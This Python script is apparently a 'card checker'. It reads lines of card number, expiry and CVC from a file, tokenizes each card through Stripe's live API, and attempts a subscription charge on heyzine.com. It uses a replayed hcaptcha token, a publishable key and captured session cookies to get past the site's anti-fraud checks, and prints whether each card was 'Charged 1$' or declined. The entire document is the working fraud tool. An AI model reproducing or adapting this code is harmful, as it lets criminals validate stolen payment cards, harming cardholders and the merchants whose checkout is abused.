import requests
import json
import time
import pyfiglet,re
import os
Z =  '\033[1;31m' 
F = '\033[2;32m' 
B = '\033[2;36m'
X = '\033[1;33m' 
C = '\033[2;35m'
logo = pyfiglet.figlet_format(' FAHIM TEST  ')
print(Z+logo)
o=("-------------------------FAHIM-------------------------")
print(F+o)	
i=input("enter your file name : ")	
g= open(i,'r')
for g in g:
	c = g.strip().split('\n')[0]
	cc = c.split('|')[0]
	exp=c.split('|')[1]
	try:
		exy=c.split('|').split('0')[1]
	except:
		exy=c.split('|')[2]
	cvc=c.split('|')[3]

	url = "https://api.stripe.com/v1/tokens"
	
	

	
	
	

	payload = f"card%5Bnumber%5D={cc}&card%5Bcvc%5D={cvc}&card%5Bexp_month%5D={exp}&card%5Bexp_year%5D={exy}&card%5Baddress_zip%5D=10080&radar_options%5Bhcaptcha_token%5D=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hKdwYXNza2V5xQYz-jn-NlzNeCa6IivDU_EtYs_9eWl02X_Qx2oSWbrDo1NonsuHpuJ3PFG0pqATc3PSeERyZonGqGtsjh4SthQMd8UWGRTef2UBXX1473FMtv-YYEk2hhE1HXlKvqpeNT7L530k3nOPbRzZWWOZCS2bgl8Fb4DoIXd5__ySd18O32aV17Akx2Fee877swvco0B7807XopDMxmMnF8gfSrfAEnYytjOH52hj1i8jBBCb_jSjoYM84jjvpKRbQq3DSQB5j_CvIwaViMAGVDCls6G_lnGfdfmXUsBiJOMWDJz3hbkQL0Kn_ttOPZawDzOmmYe8e6D-WgeRUC4xdU7fRMDwwauuLrNgGaX6pEBtgl5SSRrngZVMAV8mSVILwypZx6nqjHwPM3ApLyr5qDkdf5qZIA38F_192SKROeiw2umfNRe9a1zGfBxRf87tYy-REUcjRl6sBEVHdBfePg8ULQp03UZbuws05Iy4UjjTOBI7_AOWmBqlbeOJT6hqYUUyK4r9pjWW3LXYUwmOYOsBxbNnbCfntYLk9C3bAy2Oz6lGLbzJbj-84Nu3FDU_0xoh9o6__RDyHWRqEu5HS6x5-IbWnf7Gs0N17JkwxoP0cn1wO6lys8T2KdAavN5lx3Cty1h6occtvEsXO_jil4CUK6selMmN84qCmQKN8ivEUZ8278hX6eJ3idNKxAUXz41Idd6A64KzKROynnNNW2p7yu5YXHANWdcG1h9Fz2Ex8Na6zuVOJ-q97pQyzaOcGarTek0yKm9sz4OWsmeuaQjvsPwVJFEIUjIV_j0EmZLdkO3_Sm_1NxEvpGQKDYnmzZtwE8SlZcayLx3v8tgKYqWn4zEOetatbGZ2WBzkuINAmqnjvSNxrhzqsM-OO5bscy6ZpFLN6qh1s3Lo-MDZ_vR9NJ-d29yHt03VK3rAcznUBEPJCmVOzgoUTTP4IAL3U3BjwXPMZ5-QxPLZdK5ilB8bjagcTDH4KobtHbbttDm_h5-06RXSbP1NMzjL3fmY6vVWdNApd-5M7Zjb-NINGsG6XD9ID3p9NdJ6cKlzOQZns_wLhBOXogUjM0LNoFGll_fWksND9IUZtHDQitDi5b_4p6XbQQrau6bWB8MpiNd23EUBCM9SBklYNoF7rWJ2GIExOGzHLnsLhn9Z6mMpoSC6z3WnK67ZnDp9_7QyBnbbsbinOXKsLyBV3WOiCVq8U8IVQW60bq95Yi8C2GSSH-eujXQSHN3VAew2YMmiQYM5-hj4h7VgAYh3tXDjEUeQKccYqH0wlJkVTXTEF3YQM2o0zQAtXvw-ZWLWhoveXYPyWC-cfMDXGo4UPQRV3_5l3G_1HnaTJp6d9VqQj6gwymBTkPxPoKAdMqpnz-rhVcDmGlXSuKOQbzxEPx8O4UVHpGIFL-LCkXEQnxh_w5JvvDxsvmT7KFGhnAwpfqzVzgYkxHiTQRmhj8LRL-r0ipOiA0fj2LQcEIqEjM-WkVpYLGaQY3W6EmC9GO1uzLp9wATFKk9TojAPEw6Zy7vrkpdk0olPsVUNPBq2Ue_pzku-Ri-VguvDd17nRt26vQv7xE-Usouw6CeE3DGKjZMK2RsTvfxMeePIfbWazC-2HvJa8yiE9POX2HriSPGzPBloH1_UP_dAiaKTXhDNQJeoYCjEExQ-HkBEn8GP0qleQ7iBNnXgrrlQvvjZr05hiNibUHfQ-BCWAJnowfFnaturEO2Q12A_aeucaG_AFvZurQ5MqqoGGeOBWH-QTTPQTwcpw628cfL7CWqMlMxr4hiKe0grJrxVNW5wfP5yYqWaFUaSVZMOL5WHrF8581BZVZBPehhEfILMjq9bmiwRbom9aVbm0J6kpmIaPzX95LQHIMnUdF_fVSCKC36BNMZNzzSDgKjl05uwu4EYgCIaXXb2jfC3T2uZLjIpPvQNxmWxBf__LBEeVQcw2ZRk6S42ury3G6aiViXasKTdYfWO14y8YhegAeTwxl6pgTuJe8LJwK05uROXH6c2h1dXlcPnxBfNiVRJp7H2U6UyamnrVEfZ0njLLWbfMUDgxLGs_WVlFPKyc9BdXGMnr5vumWhuUBlAUxiE12LJKr2YAt6uqKef6Bl4IpIlMPUT8sYAo2V4cM5l-kXdqHNoYXJkX2lkzgMxg2-icGQA.2cHmUo-YjMuPjKo3RqRSNgmNg4jqEdgBijPdzu0EwJM&guid=f36e654c-2248-4a56-8746-0bcabde1c8d6bf4d17&muid=dc5653b3-5c28-41a9-8065-08142648b1fe4ceca3&sid=92975024-d0dc-4532-a762-8b79bd538649e7829a&payment_user_agent=stripe.js%2Ff8ffa9ca1b%3B%2Bstripe-js-v3%2Ff8ffa9ca1b%3B%2Bcard-element&referrer=https%3A%2F%2Fheyzine.com&time_on_page=138710&key=pk_live_IK2dtWtofPWtmqRd9Cfzih6v002eOfYr9Q&pasted_fields=number"
	
	

	
	
	

	headers = {
	
	

	'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
	
	

	'Accept': "application/json",
	
	

	'Content-Type': "application/x-www-form-urlencoded",
	
	

	'sec-ch-ua': "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
	
	

	'sec-ch-ua-mobile': "?1",
	
	

	'sec-ch-ua-platform': "\"Android\"",
	
	

	'origin': "https://js.stripe.com",
	
	

	'sec-fetch-site': "same-site",
	
	

	'sec-fetch-mode': "cors",
	
	

	'sec-fetch-dest': "empty",
	
	

	'referer': "https://js.stripe.com/",
	
	

	'accept-language': "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7"
	
	

	}
	
	

	
	
	

	response = requests.post(url, data=payload, headers=headers)
	
	

	
	
	

	try:
		id=(response.json()["id"])
	except:
		id='tok_1OwFYkEfwktTgipSvRERecQc'
	
	

	url = "https://heyzine.com/payment/subscription"
	
	

	
	
	

	payload = f"plan=SUBS_STANDARD&billingDetails%5Bemail%5D=&billingDetails%5Bname%5D=Bje&stripeToken={id}&currency=USD"
	
	

	
	
	

	headers = {
	
	

	'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
	
	

	'Content-Type': "application/x-www-form-urlencoded",
	
	

	'sec-ch-ua': "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
	
	

	'sec-ch-ua-mobile': "?1",
	
	

	'sec-ch-ua-platform': "\"Android\"",
	
	

	'Origin': "https://heyzine.com",
	
	

	'Sec-Fetch-Site': "same-origin",
	
	

	'Sec-Fetch-Mode': "cors",
	
	

	'Sec-Fetch-Dest': "empty",
	
	

	'Referer': "https://heyzine.com/",
	
	

	'Accept-Language': "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7",
	
	

	'Cookie': "heyzine_session=a6c09c8q0fajad58fbqarcvm33; __stripe_mid=dc5653b3-5c28-41a9-8065-08142648b1fe4ceca3; __stripe_sid=92975024-d0dc-4532-a762-8b79bd538649e7829a"
	
	

	}
	
	

	
	
	

	response = requests.post(url, data=payload, headers=headers)
	
	

	
	
	

	r= (c+response.text)
	if 'secret' in r:
		key=(response.text.split('"client_secret":"')[1].split('"')[0])
		method=(response.text.split('"payment_method":"')[1].split('"')[0])
		keyurl=key.split('_secret_')[0]
		url = f"https://api.stripe.com/v1/payment_intents/{keyurl}/confirm"
		payload = f"payment_method={method}&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_IK2dtWtofPWtmqRd9Cfzih6v002eOfYr9Q&client_secret="+key
		headers = {
  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
  'Accept': "application/json",
  'Content-Type': "application/x-www-form-urlencoded",
  'sec-ch-ua': "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
  'sec-ch-ua-mobile': "?1",
  'sec-ch-ua-platform': "\"Android\"",
  'origin': "https://js.stripe.com",
  'sec-fetch-site': "same-site",
  'sec-fetch-mode': "cors",
  'sec-fetch-dest': "empty",
  'referer': "https://js.stripe.com/",
  'accept-language': "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7"
}
		rr = requests.post(url, data=payload, headers=headers).text
		if 'Success' in rr:
		    print(F+c+'Charged 1$')
		else:
			print(c+rr)
			
	else:
		if 'Your card was declined.' in r:
			print(Z+c+'Your card was declined.')
		else:
			print(c+r)
